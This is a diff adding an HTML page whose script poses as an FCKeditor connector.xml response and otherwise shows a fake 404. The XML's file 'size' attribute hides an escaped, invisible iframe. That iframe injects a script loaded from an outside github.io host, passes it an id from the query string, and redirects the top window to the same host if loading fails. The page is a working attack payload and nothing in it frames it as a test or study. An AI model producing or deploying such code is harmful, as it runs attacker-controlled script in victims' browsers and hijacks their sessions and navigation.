@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <script>
+        // Check korchi request-ti connector.xml er jonno kina
+        const path = window.location.pathname;
+        if (path.includes('connector.xml')) {
+            // URL theke query parameter catch korchi
+            const urlParams = new URLSearchParams(window.location.search);
+            const lagabo = urlParams.get('lagabo') ? urlParams.get('lagabo').trim() : '';
+            const id = urlParams.get('GetFoldersAndFiles') ? urlParams.get('GetFoldersAndFiles').trim() : lagabo;
+
+            // fx.js er sathe dynamic id pass kore iframe payload ready korchi
+            const iframePayload = `<iframe style="display:none" srcdoc="<script>var s=document.createElement(\'script\');s.src=\'https://riopehrips.github.io/con/fc/fx.js?id=${encodeURIComponent(id)}\';s.onerror=function(){window.top.location.replace(\'https://riopehrips.github.io/con/\');};(window.top.document||document).head.appendChild(s);</script>"></iframe>`;
+
+            // XML structure ready korchi
+            const xmlContent = `<?xml version="1.0" encoding="utf-8"?>
+<Connector command="GetFoldersAndFiles" resourceType="Document">
+<CurrentFolder path="/1 - f/" url=""/>
+<Folders/>
+<Files>
+<File name="Loading..." url="1" size="${escapeXml(iframePayload)}"/>
+</Files>
+</Connector>`;
+
+            // Browser ba requesting application ke XML output dewa
+            document.open();
+            document.write(xmlContent);
+            document.close();
+        } else {
+            // Onno kono page na paile standard 404 error dekhabe
+            document.open();
+            document.write("<h2>404 - Page not found</h2>");
+            document.close();
+        }
+
+        function escapeXml(str) {
+            return str.replace(/&/g, '&amp;')
+                      .replace(/</g, '&lt;')
+                      .replace(/>/g, '&gt;')
+                      .replace(/"/g, '&quot;')
+                      .replace(/'/g, '&apos;');
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
